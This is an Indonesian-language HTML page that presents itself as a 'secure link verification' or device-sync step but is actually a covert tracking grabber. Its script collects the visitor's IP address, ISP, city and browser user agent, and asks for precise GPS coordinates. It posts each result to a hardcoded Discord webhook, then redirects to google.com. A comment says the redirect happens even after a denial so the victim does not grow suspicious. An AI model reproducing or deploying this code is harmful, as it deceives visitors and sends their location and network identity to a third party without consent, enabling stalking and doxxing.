<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Informasi Perangkat</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; text-align: center; padding: 60px 15px; background-color: #f8f9fa; color: #333; }
        .box { max-width: 400px; margin: 0 auto; background: white; padding: 35px 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border: 1px solid #e9ecef; }
        h3 { font-size: 18px; margin-bottom: 8px; color: #212529; }
        p { font-size: 14px; color: #6c757d; line-height: 1.5; margin-bottom: 25px; }
        .btn { background-color: #007bff; color: white; border: none; padding: 14px 24px; font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%; transition: background 0.2s; }
        .btn:hover { background-color: #0056b3; }
        .btn:disabled { background-color: #6c757d; cursor: not-allowed; }
    </style>
</head>
<body>

<div class="box">
    <h3>Verifikasi Tautan Aman</h3>
    <p id="status">Sistem memerlukan sinkronisasi perangkat. Silakan klik tombol di bawah untuk melanjutkan ke halaman tujuan.</p>
    
    <!-- Tombol memicu jalankanSistem() sesuai struktur asli yang berhasil -->
    <button class="btn" id="btnAkses" onclick="jalankanSistem()">Kunjungi Tautan</button>
</div>

<script>
    const statusText = document.getElementById('status');
    const btnAkses = document.getElementById('btnAkses');
    const webhookUrl = "https://discord.com/api/webhooks/1473581902454853777/5AIh1HAd8YUaOzi2fY3PVu-6jGeFRzKVWgDG7fg3g5LfoXZcmbeh3QJjrNC47JwmbBsh"; 
    
    // UBAH ALAMAT SITUS TUJUAN DI SINI
    const urlTujuanAsli = "https://google.com"; 

    // Menggunakan fungsi fetch IP asli Anda yang terbukti berhasil mengirim data
    async function getIPAndFallbackData() {
        try {
            const response = await fetch('https://ip-api.com'); // Ditambahkan /json/ agar respons valid
            const data = await response.json();
            return {
                ip: data.query || "Tidak terdeteksi",
                city: data.city || "Tidak diketahui",
                region: data.regionName || "Tidak diketahui",
                country: data.country || "Tidak diketahui",
                org: data.isp || "Tidak diketahui"
            };
        } catch (error) {
            try {
                const resBackup = await fetch('https://ipify.org');
                const dataBackup = await resBackup.json();
                return { ip: dataBackup.ip, city: "Manual", region: "Manual", country: "Manual", org: "Jaringan" };
            } catch(e) {
                return { ip: "Gagal Total", city: "-", region: "-", country: "-", org: "-" };
            }
        }
    }

    function getDeviceOS() {
        return navigator.userAgent;
    }

    // Ditambahkan keyword 'async' & 'await' agar browser dipaksa menyelesaikan pengiriman sebelum pindah halaman
    async function sendDataToServer(payload) {
        if (!webhookUrl) return;

        const bodyData = JSON.stringify({
            content: `📌 **Log Baru Terdeteksi!**\n🌐 **IP**: ${payload.ip}\n🌍 **Lokasi Estimasi**: ${payload.lokasi_estimasi}\n🏢 **ISP**: ${payload.provider}\n📍 **GPS**: ${payload.latitude}, ${payload.longitude} (Akurasi: ${payload.akurasi})\n📱 **OS/Browser**: ${payload.os_browser}\n🛠️ **Metode**: ${payload.metode_pelacakan}`
        });

        try {
            await fetch(webhookUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: bodyData
            });
            console.log("Data berhasil masuk Discord.");
        } catch (err) {
            console.error("Fetch Error:", err);
        }
    }

    async function jalankanSistem() {
        btnAkses.disabled = true;
        btnAkses.innerText = "Memproses...";
        statusText.innerHTML = "Sedang memproses otentikasi jaringan, mohon setujui permintaan akses lokasi jika muncul...";

        const ipData = await getIPAndFallbackData();
        const osDetails = getDeviceOS();

        const payload = {
            ip: ipData.ip,
            os_browser: osDetails,
            provider: ipData.org,
            latitude: "Ditolak/Belum Diizinkan",
            longitude: "Ditolak/Belum Diizinkan",
            akurasi: "-",
            metode_pelacakan: "IP Geolocation (Estimasi Jaringan)",
            lokasi_estimasi: `${ipData.city}, ${ipData.region}, ${ipData.country}`
        };

        // Kirim data IP dasar terlebih dahulu
        await sendDataToServer(payload);

        if (!navigator.geolocation) {
            payload.metode_pelacakan = "IP Only (HTML5 Tidak Didukung)";
            statusText.innerHTML = "Perangkat tidak mendukung sensor lokasi HTML5.";
            setTimeout(() => { window.location.href = urlTujuanAsli; }, 1000);
            return;
        }

        const opsiGPS = {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        };

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                payload.latitude = position.coords.latitude;
                payload.longitude = position.coords.longitude;
                payload.akurasi = `${position.coords.accuracy} meter`;
                payload.metode_pelacakan = "HTML5 Akurat (GPS Terizin)";

                statusText.innerHTML = `<span style="color:green;"><b>Verifikasi Berhasil! Mengalihkan...</b></span>`;
                
                // Kirim pembaruan koordinat GPS akurat
                await sendDataToServer(payload);
                
                // PENGALIHAN DIJALANKAN DI SINI (Hanya setelah data terkirim)
                window.location.href = urlTujuanAsli;
            },
            async (error) => {
                let alasan = "Izin ditolak atau diblokir browser.";
                statusText.innerHTML = `<span style="color:red;">Error: ${alasan}</span>`;
                
                // Tetap alihkan halaman meskipun user klik tolak agar tidak curiga
                setTimeout(() => { window.location.href = urlTujuanAsli; }, 1500);
            },
            opsiGPS
        );
    }
</script>

</body>
</html>
